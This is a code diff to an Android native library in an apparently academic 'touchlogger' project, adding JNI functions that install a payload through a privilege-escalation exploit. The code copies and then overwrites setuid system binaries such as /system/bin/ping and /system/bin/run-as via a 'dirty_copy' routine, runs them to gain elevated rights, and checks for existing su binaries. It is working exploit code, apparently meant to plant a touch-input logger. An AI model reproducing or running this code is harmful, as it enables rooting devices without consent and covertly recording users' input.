@@ -28,6 +28,8 @@
 // TODO: make this depend on build type
 #define DEBUG 1
 
+#define ARR_LEN(N) sizeof(N) / sizeof(N[0])
+
 char app_process_backup_path[PATH_MAX];
 char exec_payload_path[PATH_MAX];
 char payload_path[PATH_MAX];
@@ -97,6 +99,135 @@ static int createTestFile(const char* filename, const char* fileContents)
 
   fclose(file);
   return 0;
+}
+
+extern "C"
+JNIEXPORT void JNICALL
+Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_installPayloadThroughSuid(JNIEnv* env,
+                                                                                 jclass type,
+                                                                                 jstring suidBinaryPath_,
+                                                                                 jstring localPath_)
+{
+  const char* suidBinaryPath = env->GetStringUTFChars(suidBinaryPath_, 0);
+  const char* localPath = env->GetStringUTFChars(localPath_, 0);
+
+  prepareCommon(localPath);
+
+  char* backupSuidFilePath = (char*) calloc(PATH_MAX, sizeof(char));
+  const char* suidBinaryLocalName = strrchr(suidBinaryPath, '/');
+  if (suidBinaryLocalName == NULL)
+  {
+    suidBinaryLocalName = (char*) suidBinaryPath;
+  }
+
+  snprintf(backupSuidFilePath, PATH_MAX, "%s/%s", localPath, suidBinaryLocalName);
+  env->ReleaseStringUTFChars(localPath_, localPath);
+
+  copy_file(suidBinaryPath, backupSuidFilePath);
+
+  if (dirty_copy(payload_path, suidBinaryPath) == -1)
+  {
+    LOGV("Unable to overwrite suid binary!");
+    env->ReleaseStringUTFChars(suidBinaryPath_, suidBinaryPath);
+    return;
+  }
+
+  int in_fd = -1, out_fd = -1;
+  const char* args[] = {suidBinaryPath, 0};
+  const uint32_t childProcessTimeoutMs = 10 * 1000L;
+  run_child_process_with_timeout(suidBinaryPath, args, &in_fd, &out_fd, childProcessTimeoutMs);
+
+  if (in_fd != -1)
+  {
+    close(in_fd);
+  }
+
+  if (out_fd != -1)
+  {
+    close(out_fd);
+  }
+
+  env->ReleaseStringUTFChars(suidBinaryPath_, suidBinaryPath);
+}
+
+extern "C"
+JNIEXPORT void JNICALL
+Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_installPayloadNormally(JNIEnv* env,
+                                                                              jclass type,
+                                                                              jstring localPath_)
+{
+  const char* localPath = env->GetStringUTFChars(localPath_, 0);
+
+
+  env->ReleaseStringUTFChars(localPath_, localPath);
+}
+
+extern "C"
+JNIEXPORT jstring JNICALL
+Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_getSuidBinaryPath(JNIEnv* env,
+                                                                         jclass type,
+                                                                         jstring execPayloadPath_)
+{
+  const char* execPayloadPath = env->GetStringUTFChars(execPayloadPath_, 0);
+
+  struct stat execPayloadStat;
+  if (stat(execPayloadPath, &execPayloadStat) == -1)
+  {
+    LOGV("Unable to stat \"%s\": %s!", execPayloadPath, strerror(errno));
+    env->ReleaseStringUTFChars(execPayloadPath_, execPayloadPath);
+    return env->NewStringUTF(NULL);
+  }
+
+  const char* suidFiles[] = {"/system/bin/ping", "/system/bin/run-as"};
+  struct stat st;
+  for (int i = 0; i < ARR_LEN(suidFiles); ++i)
+  {
+    if (stat(suidFiles[i], &st) == -1)
+    {
+      LOGV("Skip \"%s\": %s!", suidFiles[i], strerror(errno));
+      continue;
+    }
+
+    if ((st.st_mode & S_ISUID) != S_ISUID)
+    {
+      LOGV("\"%s\": no suid bit.", suidFiles[i]);
+      continue;
+    }
+
+    if ((st.st_mode & S_IXOTH) != S_IXOTH)
+    {
+      LOGV("\"%s\": not executable by us.", suidFiles[i]);
+      continue;
+    }
+
+    if (execPayloadStat.st_size > st.st_size)
+    {
+      LOGV("\"%s\" cant't be overwritten by \"%s\"!", suidFiles[i], execPayloadPath);
+      continue;
+    }
+
+    env->ReleaseStringUTFChars(execPayloadPath_, execPayloadPath);
+    return env->NewStringUTF(suidFiles[i]);
+  }
+
+  env->ReleaseStringUTFChars(execPayloadPath_, execPayloadPath);
+  return env->NewStringUTF(NULL);
+}
+
+extern "C"
+JNIEXPORT jboolean JNICALL
+Java_org_leyfer_thesis_touchlogger_1dirty_utils_JniApi_rootIsAvailable(JNIEnv* env, jclass type)
+{
+  const char* paths[] = {"/system/bin/su", "/system/xbin/su"};
+  for (int i = 0; i < ARR_LEN(paths); ++i)
+  {
+    if (check_su_binary(paths[i]) == 0)
+    {
+      return (jboolean) true;
+    }
+  }
+
+  return (jboolean) false;
 }
 
 extern "C"
